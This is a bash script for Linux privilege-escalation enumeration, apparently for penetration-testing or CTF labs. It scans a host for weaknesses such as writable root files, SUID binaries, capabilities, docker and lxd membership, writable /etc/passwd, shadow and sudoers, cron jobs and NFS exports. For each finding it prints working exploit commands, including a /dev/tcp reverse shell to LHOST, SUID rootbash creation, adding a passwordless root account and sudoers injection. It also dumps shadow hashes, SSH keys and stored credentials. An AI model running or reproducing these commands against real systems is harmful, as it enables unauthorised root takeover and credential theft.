#!/bin/bash
# =============================================================================
# linux-korek.sh - linPEAS Gap Filler with Exploit Hints
# Author: korek
# =============================================================================
# Usage:
#   ./linux-korek.sh          # quick mode (~30 sec)
#   ./linux-korek.sh --full   # full mode (~2 min)
# =============================================================================

FULL=0
[ "$1" = "--full" ] && FULL=1

R='\033[0;31m'; G='\033[0;32m'; Y='\033[0;33m'
C='\033[0;36m'; W='\033[1;37m'; N='\033[0m'

hit()    { echo -e "${G}[+]${N} $1"; }
info()   { echo -e "    ${W}>>>${N} $1"; }
sec()    { echo -e "\n${C}[*] ===== $1 =====${N}"; }
warn()   { echo -e "${Y}[!]${N} $1"; }
hot()    { echo -e "${R}[!!]${N} $1"; }
exploit(){ echo -e "    ${Y}[EXPLOIT]${N} $1"; }
gtfo()   { echo -e "    ${Y}[GTFOBins]${N} https://gtfobins.github.io/gtfobins/$1/"; }

echo -e "${C}================================================${N}"
echo -e "${C}  linux-korek.sh - linPEAS Gap Filler${N}"
[ $FULL -eq 0 ] && echo -e "${Y}  QUICK MODE - run --full for complete scan${N}"
[ $FULL -eq 1 ] && echo -e "${G}  FULL MODE${N}"
echo -e "${C}================================================${N}"

# ===========================================================
# QUICK MODE
# ===========================================================

# 1. Root-owned writable files
sec "ROOT-OWNED WRITABLE FILES"
found=0
find / -user root -writable -type f 2>/dev/null | \
grep -vE "(/proc|/sys|/dev|/tmp|/var/tmp|/run)" | \
while read f; do
    hot "Root-owned writable: $f"
    exploit "echo '#!/bin/bash' > $f"
    exploit "echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> $f"
    exploit "wait for execution, then: /tmp/rootbash -p"
    found=1
done
[ $found -eq 0 ] 2>/dev/null && info "None found"

# 2. Writable PATH directories
sec "WRITABLE PATH DIRECTORIES"
echo $PATH | tr ':' '\n' | while read dir; do
    if [ -w "$dir" ] 2>/dev/null; then
        hot "Writable PATH dir: $dir"
        exploit "Create malicious binary with same name as root-executed command"
        exploit "echo '#!/bin/bash\nbash -i >& /dev/tcp/LHOST/LPORT 0>&1' > $dir/<cmd>"
        exploit "chmod +x $dir/<cmd> && wait for root to execute"
    fi
    find "$dir" -writable -type f 2>/dev/null | while read f; do
        hot "Writable binary in PATH: $f"
        exploit "cp /bin/bash $f (if SUID) OR replace with reverse shell"
    done
done

# 3. Custom SUID not in package manager
sec "CUSTOM SUID BINARIES"
find / -perm -4000 -type f 2>/dev/null | while read f; do
    if command -v dpkg >/dev/null 2>&1; then
        dpkg -S "$f" >/dev/null 2>&1 && continue
    fi
    bname=$(basename "$f")
    hot "Custom SUID: $f"
    gtfo "$bname"
    exploit "Check GTFOBins link above for SUID exploitation"
    exploit "Common: $f -p  OR  $f --exec /bin/bash  OR strings $f for clues"
    [ -w "$f" ] && hot "WRITABLE SUID - instant root!" && \
        exploit "cp /bin/bash $f && $f -p"
done

# 4. Dangerous capabilities
sec "DANGEROUS CAPABILITIES"
getcap -r / 2>/dev/null | \
grep -E "(cap_setuid|cap_dac_override|cap_sys_admin|cap_chown|cap_fowner)" | \
while read line; do
    f=$(echo "$line" | awk '{print $1}')
    bname=$(basename "$f")
    hot "Dangerous capability: $line"
    gtfo "$bname"
    case "$bname" in
        python*) exploit "$f -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'" ;;
        perl)    exploit "$f -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/bash\";'" ;;
        ruby)    exploit "$f -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'" ;;
        vim*)    exploit "$f -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\",\"sh\",\"-c\",\"reset; exec sh\")'" ;;
        node)    exploit "$f -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\",[],{stdio:[0,1,2]})'" ;;
        tar)     exploit "$f -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh" ;;
        *)       exploit "Check GTFOBins for $bname with cap_setuid" ;;
    esac
done

# 5. Docker/LXD group
sec "DOCKER / LXD GROUP"
if id | grep -q docker; then
    hot "In docker group!"
    exploit "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
    exploit "docker run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh"
fi
if id | grep -q lxd; then
    hot "In lxd group!"
    exploit "lxc init ubuntu:18.04 test -c security.privileged=true"
    exploit "lxc config device add test whatever disk source=/ path=/mnt/root recursive=true"
    exploit "lxc start test && lxc exec test -- /bin/sh"
    exploit "Full guide: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html"
fi
if [ -w /var/run/docker.sock ] 2>/dev/null; then
    hot "Docker socket writable!"
    exploit "docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh"
fi

# 6. Writable sensitive system files
sec "WRITABLE SYSTEM FILES"
for f in /etc/passwd /etc/shadow /etc/sudoers /etc/crontab /etc/ssh/sshd_config; do
    [ -w "$f" ] 2>/dev/null || continue
    hot "WRITABLE: $f"
    case "$f" in
        /etc/passwd)
            exploit "Add root user: echo 'korek::0:0::/root:/bin/bash' >> /etc/passwd"
            exploit "Then: su korek (no password needed)"
            ;;
        /etc/shadow)
            exploit "Replace root hash with known password hash"
            exploit "openssl passwd -1 -salt xyz password123 → copy hash to root entry"
            ;;
        /etc/sudoers)
            exploit "echo '\$(whoami) ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"
            exploit "Then: sudo su"
            ;;
        /etc/crontab)
            exploit "echo '* * * * * root cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /etc/crontab"
            exploit "Wait 1 min then: /tmp/rootbash -p"
            ;;
        /etc/ssh/sshd_config)
            exploit "Add: PermitRootLogin yes, PasswordAuthentication yes"
            exploit "Restart sshd, set root password, SSH in as root"
            ;;
    esac
done

# 7. Sudo permissions check
sec "SUDO PERMISSIONS"
sudo_ver=$(sudo -V 2>/dev/null | grep "Sudo version" | awk '{print $3}')
[ -n "$sudo_ver" ] && info "Sudo version: $sudo_ver"
echo "$sudo_ver" | grep -qE "^1\.[0-8]\.|^1\.9\.(0|1|2|3|4|5|6|7|8|9|10|11|12p1)" && \
    hot "Sudo $sudo_ver vulnerable to CVE-2023-22809!" && \
    exploit "SUDO_EDITOR='vim -- /etc/sudoers' sudoedit /etc/hosts"

# Check sudo -l entries
sudo -l 2>/dev/null | grep -v "^$\|Matching\|may run\|env_reset\|mail_badpass\|secure_path" | \
while read line; do
    hit "Sudo entry: $line"
    bin=$(echo "$line" | awk '{print $NF}' | sed 's|.*/||')
    gtfo "$bin"
    exploit "Check GTFOBins sudo section for: $bin"
done

# 8. Shell history cred grep
sec "SHELL HISTORY CREDENTIALS"
for histfile in ~/.bash_history ~/.zsh_history /home/*/.bash_history /root/.bash_history; do
    [ -f "$histfile" ] 2>/dev/null || continue
    hits=$(grep -iE "(pass|secret|key|mysql.*-p|psql.*-U|sshpass)" \
           "$histfile" 2>/dev/null | grep -v "^#")
    [ -n "$hits" ] && hit "$histfile:" && echo "$hits" | head -10 | while read l; do info "$l"; done
done

# 9. Shadow backups
sec "SHADOW / PASSWD BACKUPS"
[ -r /etc/shadow ] 2>/dev/null && \
    hot "READABLE /etc/shadow!" && \
    exploit "Copy hashes and crack: hashcat -m 1800 hashes.txt rockyou.txt" && \
    cat /etc/shadow 2>/dev/null | grep -v "^[^:]*:[!*]" | head -10
for f in /etc/shadow- /etc/shadow.bak /etc/passwd- /var/shadow; do
    [ -r "$f" ] 2>/dev/null && hot "Readable backup: $f" && \
        exploit "hashcat -m 1800 $f /usr/share/wordlists/rockyou.txt"
done

# 10. Writable cron binaries
sec "CRON WRITABLE BINARIES"
for f in /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/*; do
    [ -f "$f" ] 2>/dev/null || continue
    cat "$f" 2>/dev/null | grep -v "^#\|^$" | while read line; do
        for word in $line; do
            if [ -f "$word" ] && [ -w "$word" ]; then
                hot "Writable cron binary: $word"
                exploit "echo '#!/bin/bash' > $word"
                exploit "echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> $word"
                exploit "chmod +x $word && wait for cron execution"
                exploit "Then: /tmp/rootbash -p"
            fi
        done
    done
done

# 11. NFS no_root_squash
sec "NFS NO_ROOT_SQUASH"
[ -r /etc/exports ] 2>/dev/null && \
grep "no_root_squash" /etc/exports 2>/dev/null | while read l; do
    hot "NFS no_root_squash: $l"
    share=$(echo "$l" | awk '{print $1}')
    exploit "On Kali: mkdir /tmp/nfs && mount -t nfs TARGET:$share /tmp/nfs"
    exploit "cp /bin/bash /tmp/nfs/ && chmod +s /tmp/nfs/bash"
    exploit "On target: $share/bash -p"
done

# 12. Interesting files
sec "INTERESTING FILES"
find /home /root /opt /var/www -maxdepth 4 \( \
    -name "flag*" -o -name "proof*" -o -name "local*" -o \
    -name "pass*.txt" -o -name "cred*.txt" -o -name "*.kdbx" -o \
    -name ".netrc" -o -name "note*.txt" \
\) -readable 2>/dev/null | while read f; do
    hit "Interesting: $f"
    [ -f "$f" ] && file "$f" 2>/dev/null | grep -q "text" && \
        cat "$f" 2>/dev/null | head -5 | while read l; do info "$l"; done
done

# ===========================================================
# FULL MODE ONLY
# ===========================================================
if [ $FULL -eq 1 ]; then

# 13. Process monitoring
sec "PROCESS MONITORING - 60 seconds"
warn "Watching for new root processes (pspy replacement)..."
declare -A seen
while IFS= read -r line; do seen["$line"]=1; done < \
    <(ps -eo pid,user,cmd --no-headers 2>/dev/null)
end=$((SECONDS+60))
while [ $SECONDS -lt $end ]; do
    while IFS= read -r line; do
        [ "${seen[$line]+_}" ] && continue
        user=$(echo "$line" | awk '{print $2}')
        cmd=$(echo "$line" | cut -d' ' -f3-)
        pid=$(echo "$line" | awk '{print $1}')
        if [ "$user" = "root" ] || [ "$user" = "0" ]; then
            hot "ROOT PROCESS [PID:$pid]: $cmd"
            exploit "Check if binary is writable: ls -la $cmd"
            exploit "Check if script is writable and replace with reverse shell"
        else
            hit "New process [$user:$pid]: $cmd"
        fi
        seen["$line"]=1
    done < <(ps -eo pid,user,cmd --no-headers 2>/dev/null)
    sleep 0.5
done

# 14. Systemd writable services
sec "WRITABLE SYSTEMD SERVICES"
find /etc/systemd /lib/systemd -name "*.service" -writable 2>/dev/null | \
while read f; do
    hot "Writable service: $f"
    grep "^Exec" "$f" 2>/dev/null | while read l; do info "$l"; done
    exploit "Edit ExecStart=/tmp/rootbash in $f"
    exploit "systemctl daemon-reload && systemctl restart <service>"
done

# 15. Archives & DB dumps
sec "ARCHIVES & DB DUMPS"
find / -maxdepth 8 \( \
    -name "*.zip" -o -name "*.tar.gz" -o -name "*.tgz" -o \
    -name "*.sql" -o -name "*.sqlite" -o -name "*.db" \
\) -readable -type f 2>/dev/null | \
grep -vE "(/usr/share|/usr/lib|/snap|linux-korek)" | \
while read f; do
    size=$(du -sh "$f" 2>/dev/null | cut -f1)
    hot "Unusual file: $f ($size)"
    case "$f" in
        *.zip) exploit "unzip -l $f | grep -iE 'pass|config|sql|key'" ;;
        *.sql) exploit "grep -iE 'INSERT.*pass|CREATE USER' $f | head -20" ;;
        *.sqlite|*.db) exploit "sqlite3 $f .tables && sqlite3 $f 'SELECT * FROM users;'" ;;
    esac
done

# 16. Non-standard directories
sec "FILES IN NON-STANDARD DIRS"
for d in /opt /srv /backup /data /var/backup; do
    [ -d "$d" ] || continue
    find "$d" -readable -type f 2>/dev/null | grep -v "linux-korek" | \
        while read f; do
            size=$(du -sh "$f" 2>/dev/null | cut -f1)
            hit "$f ($size)"
        done
done

# 17. CMS configs
sec "CMS CONFIG FILES"
for f in /var/www/html/configuration.php /var/www/html/wp-config.php \
         /var/www/*/configuration.php /var/www/*/wp-config.php; do
    [ -f "$f" ] 2>/dev/null || continue
    hot "CMS config: $f"
    grep -iE "(\\\$pass|password|DB_PASS|secret)" "$f" 2>/dev/null | \
        grep -v "^//" | head -5 | while read l; do
            info "$l"
            exploit "Use these creds to login to DB: mysql -u USER -p'PASS' DB"
        done
done

# 18. App configs
sec "APP CONFIGS WITH CREDENTIALS"
find /var/www /srv /opt /home -maxdepth 6 \( \
    -name "conn.php" -o -name "config.php" -o -name ".env" -o \
    -name "database.yml" -o -name "settings.py" \
\) -readable 2>/dev/null | while read f; do
    hits=$(grep -iE "(password|secret|api_key)" "$f" 2>/dev/null | grep -v "^#\|^//" | head -3)
    [ -n "$hits" ] && hot "Creds in: $f" && echo "$hits" | while read l; do info "$l"; done
done

# 19. SSH private keys
sec "SSH PRIVATE KEYS"
find / -maxdepth 8 \( -name "id_rsa" -o -name "id_dsa" -o \
    -name "id_ed25519" -o -name "*.pem" \) -readable -type f 2>/dev/null | \
grep -vE "(/usr/share|/usr/lib|linux-korek)" | while read f; do
    head -1 "$f" 2>/dev/null | grep -q "PRIVATE" || continue
    hot "SSH Key: $f"
    exploit "chmod 600 $f && ssh -i $f root@TARGET"
    exploit "ssh -i $f USER@TARGET"
done

# 20. Environment variables
sec "ENVIRONMENT VARIABLES WITH CREDENTIALS"
env 2>/dev/null | grep -iE "(pass|secret|key|token|api|aws)" | \
    while read l; do
        hot "Env cred: $l"
        exploit "Use credential found in environment variable"
    done

# 21. Tmux/Screen
sec "TMUX / SCREEN SESSIONS"
tmux list-sessions 2>/dev/null | while read l; do
    hit "tmux: $l"
    exploit "tmux attach -t <session_name>"
done
find /tmp -name "tmux-*" -type d 2>/dev/null | while read d; do
    stat_info=$(stat -c '%U %a' "$d" 2>/dev/null)
    hit "tmux socket dir: $d ($stat_info)"
    exploit "tmux -S $d/default attach"
done

# 22. User enumeration for spray
sec "LOCAL USERS (password spray targets)"
awk -F: '$3>=1000||$3==0{print $1" uid:"$3" shell:"$7}' /etc/passwd | \
    while read l; do info "$l"; done
exploit "Try known passwords: su <user> or ssh <user>@localhost"

fi  # end FULL mode

echo -e "\n${G}[+] Done!${N}"
echo -e "    ${R}[!!]${N} = Critical finding with exploit"
echo -e "    ${Y}[!]${N}  = Warning"
echo -e "    ${G}[+]${N}  = Information"
echo -e "    ${Y}[EXPLOIT]${N} = How to exploit"
echo -e "    ${Y}[GTFOBins]${N} = GTFOBins reference"
[ $FULL -eq 0 ] && \
    echo -e "\n${Y}Tip: Run './linux-korek.sh --full' for complete scan + process monitoring${N}"
